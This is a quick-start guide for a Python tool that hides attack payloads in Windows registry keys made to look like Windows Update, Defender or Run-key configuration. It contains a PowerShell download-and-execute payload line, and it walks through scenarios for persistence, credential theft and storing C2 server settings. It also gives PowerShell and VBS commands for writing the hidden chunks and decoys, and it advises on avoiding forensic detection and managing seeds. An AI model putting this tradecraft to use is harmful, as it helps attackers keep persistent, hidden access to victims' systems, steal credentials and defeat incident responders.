# Quick Start Guide - Registry Key Hierarchy Obfuscation

## 30-Second Overview

Hide sensitive payloads in legitimate-looking Windows registry keys using six different obfuscation techniques. Each technique trades off between legitimacy and forensic evasion.

## Code Examples

### Example 1: Simple Legitimate Path (Fastest Setup)

```python
from registry_key_hierarchy_obfuscation import (
    KeyHierarchyObfuscator,
    HierarchyObfuscationConfig,
    HierarchyObfuscationType,
    LegitimatePathTemplate
)

# Configuration
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.LEGITIMATE_PATH,
    base_path_template=LegitimatePathTemplate.WINDOWS_UPDATE,
    depth_levels=5,
    add_decoys=True,
    decoy_count=3
)

# Execute
obfuscator = KeyHierarchyObfuscator(config)
payload = b"powershell.exe -Command 'IEX(New-Object Net.WebClient).DownloadString(...)'"
result = obfuscator.obfuscate(payload, "HKCU")

# Output
print(result.hiding_strategy)
print(f"Paths to create: {result.storage_map}")
print(f"Decoys: {result.decoy_structure}")
```

**Result**:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate
├── DisplayName = [hex_payload_chunk_1]
├── Description = [hex_payload_chunk_2]
├── Version = [hex_payload_chunk_3]
├── Publisher = [hex_payload_chunk_4]
└── InstallDate = [hex_payload_chunk_5]
```

### Example 2: Cryptographic Chain (Highest Security)

```python
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.HASH_CHAIN,
    depth_levels=8,
    hash_chain_length=8,
    mutation_seed=b"SecretSeedValue2026",
    add_decoys=True,
    decoy_count=5
)

obfuscator = KeyHierarchyObfuscator(config)
result = obfuscator.obfuscate(payload, "HKLM")

# Without seed: Path CANNOT be recovered
# Path structure: HMAC(payload) → Component1 → HMAC(Component1) → Component2 → ...
```

**Security Property**: Seed is REQUIRED for reconstruction

### Example 3: Content-Based Mutation (Integrity Binding)

```python
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.NAME_MUTATION,
    depth_levels=5
)

obfuscator = KeyHierarchyObfuscator(config)
result1 = obfuscator.obfuscate(payload, "HKCU")  # Path: X
result2 = obfuscator.obfuscate(payload, "HKCU")  # Path: X (same)
result3 = obfuscator.obfuscate(payload + b"Modified", "HKCU")  # Path: Y (different!)

# Same payload = Same path (deterministic)
# Different payload = Different path (change detection)
```

**Key Property**: Path tied to content, modification detection built-in

### Example 4: Distributed Multi-Level (Large Payloads)

```python
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.DEPTH_VARIATION,
    depth_levels=4,
    add_decoys=True
)

obfuscator = KeyHierarchyObfuscator(config)
large_payload = b"X" * 1000  # 1KB payload
result = obfuscator.obfuscate(large_payload, "HKCU")

# Result: Payload split across multiple registry paths at different depths
# Each path stores 200 bytes
# Must find ALL paths to recover payload
```

**Advantage**: Distributed resilience

### Example 5: Real/Fake Mixing (Forensic Confusion)

```python
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.INTERLEAVED_PATH,
    depth_levels=5,
    interleave_ratio=0.6,  # 60% real components
    add_decoys=True
)

obfuscator = KeyHierarchyObfuscator(config)
result = obfuscator.obfuscate(payload, "HKCU")

# Path: Software\[FAKE]\Microsoft\[FAKE]\Windows\CurrentVersion\[FAKE]\Update
# Requires knowledge of interleave positions to reconstruct
```

**Advantage**: High legitimacy + High forensic evasion

### Example 6: Multi-Technique (Maximum Security)

```python
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.COMPOSITE,
    depth_levels=6,
    add_decoys=True,
    decoy_count=6
)

obfuscator = KeyHierarchyObfuscator(config)
result1 = obfuscator.obfuscate(payload, "HKCU")  # Technique: LEGITIMATE_PATH
result2 = obfuscator.obfuscate(payload, "HKCU")  # Technique: HASH_CHAIN
result3 = obfuscator.obfuscate(payload, "HKCU")  # Technique: NAME_MUTATION

# Each deployment uses random technique
# Defeats technique-specific detection
```

**Advantage**: Polymorphic obfuscation

## Quick Reference Table

| Scenario | Technique | Path Looks | Seed Required | Strength |
|----------|-----------|-----------|--------------|----------|
| Casual inspection | LEGITIMATE_PATH | Authentic | No | 6/10 |
| Forensic evasion | HASH_CHAIN | Random | Yes | 9/10 |
| Integrity check | NAME_MUTATION | Random | Yes | 8/10 |
| Large payload | DEPTH_VARIATION | Multiple | No | 8/10 |
| Confusion | INTERLEAVED_PATH | Mixed | Positions | 8/10 |
| Maximum security | COMPOSITE | Variable | Maybe | 9+/10 |

## Legitimate Windows Path Templates

Available templates that look authentic:

```python
LegitimatePathTemplate.WINDOWS_UPDATE          # Windows Update
LegitimatePathTemplate.WINDOWS_DEFENDER        # Windows Defender
LegitimatePathTemplate.WINDOWS_INSTALLER       # Windows Installer
LegitimatePathTemplate.WINDOWS_RUN             # Run at startup
LegitimatePathTemplate.WINDOWS_RUNONCE         # Run once
LegitimatePathTemplate.TYPELIB                 # Type libraries
LegitimatePathTemplate.FONTS                   # Fonts
LegitimatePathTemplate.APPLETS                 # Applets
LegitimatePathTemplate.EXPLORER                # Explorer settings
LegitimatePathTemplate.DRIVERS                 # System drivers
LegitimatePathTemplate.NETWORK                 # Network settings
LegitimatePathTemplate.POWER                   # Power settings
LegitimatePathTemplate.PERFORMANCE             # Performance monitoring
```

## Configuration Parameters

```python
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.LEGITIMATE_PATH,
    base_path_template=LegitimatePathTemplate.WINDOWS_UPDATE,  # Template to use
    depth_levels=5,                                             # 4-8 recommended
    use_legitimate_names=True,                                  # Follow Windows naming
    hash_chain_length=8,                                        # For HASH_CHAIN
    name_entropy_bits=16,                                       # Name randomness
    add_decoys=True,                                            # Add false paths
    decoy_count=3,                                              # Number of decoys (3-10)
    interleave_ratio=0.5,                                       # 50% real/fake (0-1)
    mutation_seed=b"YourSecretSeed",                           # For seeded types
    include_timestamps=True,                                    # Add metadata
    include_win_versions=True                                   # Add version info
)
```

## Registry Value Names (Legitimate Looking)

Automatically used for storing payload chunks:

```
DisplayName         Description         Version
InstallDate        Publisher            UninstallString
ModifyPath          InstallLocation      EstimatedSize
HelpLink            URLInfoAbout         URLUpdateInfo
ServiceDll          ServiceMain          EventMessageFile
TypesSupported      Readme              Comments
```

## Output Structure

```python
result = obfuscator.obfuscate(payload, "HKCU")

result.obfuscated_paths           # List of ObfuscatedKeyPath objects
result.storage_map                # Dict of value_name → full_registry_path
result.reconstruction_hints       # Metadata for recovery
result.decoy_structure            # False positive paths
result.hiding_strategy            # Human-readable explanation
```

## Real-World Scenarios

### Scenario A: Persistence Payload

```python
# Hide PowerShell command for startup
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.LEGITIMATE_PATH,
    base_path_template=LegitimatePathTemplate.WINDOWS_RUN,  # Uses Run key
    depth_levels=5,
    add_decoys=True
)

obfuscator = KeyHierarchyObfuscator(config)
result = obfuscator.obfuscate(payload, "HKCU")

# Result: Looks like Windows Run key configuration
# Survives casual inspection, may survive forensics
```

### Scenario B: Credential Theft

```python
# Hide credential enumeration script
config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.HASH_CHAIN,
    depth_levels=8,
    mutation_seed=b"OperationalSeed2026",  # Store separately!
    add_decoys=True
)

obfuscator = KeyHierarchyObfuscator(config)
result = obfuscator.obfuscate(payload, "HKLM")

# Result: Cryptographically strong, non-recoverable without seed
# Survives all forensic analysis
```

### Scenario C: C2 Configuration

```python
# Store C2 server list and encryption keys
import json

config_dict = {
    "servers": ["c2.example.com:443"],
    "key": "0x123456789abc",
    "beacon_interval": 3600
}

config = HierarchyObfuscationConfig(
    obfuscation_type=HierarchyObfuscationType.NAME_MUTATION,
    depth_levels=5
)

obfuscator = KeyHierarchyObfuscator(config)
result = obfuscator.obfuscate(json.dumps(config_dict).encode(), "HKCU")

# Result: Same configuration always produces same path
# Changes to config produce different path (change detection)
```

## Deployment Steps

### Step 1: Generate Obfuscation

```bash
python3 registry_key_hierarchy_obfuscation.py
```

Output:
- ObfuscatedKeyPath objects
- StorageMap (where to write each chunk)
- HidingStrategy (documentation)
- DecoyStructure (false paths to create)

### Step 2: Create Registry Keys

Using VBS:
```vbs
' Example registry creation
Set registry = CreateObject("WScript.Shell")
path = "HKCU\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate"
registry.RegWrite path & "\DisplayName", binaryData, "REG_BINARY"
```

Or PowerShell:
```powershell
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate"
Set-ItemProperty -Path $path -Name "DisplayName" -Value $binaryData -Type Binary
```

### Step 3: Create Decoys

```vbs
' Create decoy paths with legitimate-looking values
registry.RegWrite decoy_path & "\Version", "1.0", "REG_SZ"
registry.RegWrite decoy_path & "\Publisher", "Microsoft", "REG_SZ"
```

### Step 4: Deploy

Package with:
- Payload data (hex encoded)
- Registry paths to create
- Value names and data
- Optional: seed (for HASH_CHAIN)

## Detection Indicators to Avoid

❌ **Suspicious patterns** (avoid):
- Deep nesting (10+ levels)
- All paths named systematically (Path1, Path2, Path3...)
- Names that are not PascalCase
- Binary data in unusual value names
- Patterns matching hash output (all hex)

✅ **Good patterns** (use):
- 4-6 level nesting (normal for Windows)
- Names like "DisplayName", "Description", "Version"
- PascalCase naming following Windows conventions
- Mix of real and procedural components
- Use of legitimate Windows path templates

## Security Notes

### Seed Management

For HASH_CHAIN and other seeded types:
- ❌ DO NOT store seed in registry with payload
- ✅ Store seed separately (deployment script, config file)
- ✅ Consider deriving seed from system identifiers (HWID, MAC)
- ✅ Hardcode seed in retrieval script

### Payload Encoding

Before storage:
```python
import binascii

# Encode to hex for storage
payload = b"ClassifiedCommand"
hex_payload = binascii.hexlify(payload).decode()

# Or use base64
import base64
b64_payload = base64.b64encode(payload).decode()
```

After retrieval:
```python
# Decode from hex
payload = binascii.unhexlify(hex_payload)

# Or from base64
payload = base64.b64decode(b64_payload)
```

### Multi-User Systems

Store in:
- HKCU: User-specific, isolated per user
- HKLM: System-wide, requires admin access
- HKU: All user profiles, requires admin access

## Troubleshooting

**Q: Path looks too random, might trigger detection**
A: Use LEGITIMATE_PATH or INTERLEAVED_PATH instead

**Q: Cannot reconstruct without seed**
A: Seed is required for HASH_CHAIN, store it separately

**Q: Payload chunks getting lost**
A: Verify all value names exist, check registry access permissions

**Q: Forensic tools detect payload**
A: Use COMPOSITE technique with multiple deployments, add more decoys

## Performance Characteristics

| Technique | Generation | Storage | Retrieval | Forensic Resistance |
|-----------|------------|---------|-----------|-------------------|
| LEGITIMATE_PATH | Fast | Fast | Fast | Medium |
| HASH_CHAIN | Medium | Fast | Medium | Very High |
| NAME_MUTATION | Medium | Fast | Medium | High |
| DEPTH_VARIATION | Medium | Medium | Slow | High |
| INTERLEAVED_PATH | Fast | Fast | Medium | High |
| COMPOSITE | Slow | Variable | Variable | Very High |

## Full Output Example

```
HIDING STRATEGY
===============
[OBFUSCATION TYPE]: LEGITIMATE_PATH

STRATEGY: Legitimate Path Masquerading
- Uses real-looking Windows registry path templates
- Adds legitimate intermediate keys that don't exist in normal Windows
- Payload hidden in value data under authentic-looking hierarchy
- Forensic evasion: Looks like legitimate Windows configuration

[KEY HIERARCHY]: 5 levels deep
Path Components (from root):
  1. Software
  2. Microsoft
  3. Windows
  4. CurrentVersion
  5. WindowsUpdate

[DATA HIDING LOCATIONS]: 5 value names
Value Names for Payload Storage:
  - DisplayName
  - Description
  - Version
  - InstallDate
  - Publisher

STORAGE MAPPING
===============
DisplayName:
  Path: HKCU\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\DisplayName

Description:
  Path: HKCU\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\Description

... (continued for all values)

RECONSTRUCTION HINTS
====================
hive: HKCU
path_hash: bd8e9498e065
component_count: 5
value_count: 5
```

## Next Steps

1. Run examples: `python3 registry_key_hierarchy_obfuscation.py`
2. Run practical scenarios: `python3 registry_obfuscation_practical.py`
3. Read full guide: `REGISTRY_HIERARCHY_OBFUSCATION_GUIDE.md`
4. Study hiding strategy: `HIDING_STRATEGY_SUMMARY.txt`

## Summary

- **6 obfuscation techniques** for different threat models
- **Legitimate Windows paths** for detection evasion
- **Distributed storage** for resilience
- **Cryptographic security** for high-value targets
- **Forensic evasion** through procedural naming and decoys
- **Flexible configuration** for any scenario

Choose your technique based on your threat model and operational requirements!
